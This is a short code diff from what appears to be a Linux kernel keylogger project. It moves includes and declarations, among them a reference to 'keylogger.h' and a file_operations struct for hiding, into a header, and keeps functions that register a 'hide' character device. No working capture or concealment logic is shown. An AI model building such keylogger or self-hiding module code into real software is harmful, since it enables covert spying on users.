@@ -1,13 +1,4 @@
-#ifndef _MODULE_H_
-#define _MODULE_H_
-#include "keylogger.h"
-dev_t dev_num1;
-struct cdev *mcdev1;
-static struct file_operations fops_hide =
-{
-    .owner = THIS_MODULE,
-    .open = dev_open_fops_for_hide
-};
+#include "module.h"
 static int hide_driver_entery(void)
 {
     ret = alloc_chrdev_region(&dev_num1, 0, 1, "hide");
@@ -43,4 +34,3 @@ static int start_hide(void)
     }
     return 1;
 }
-#endif
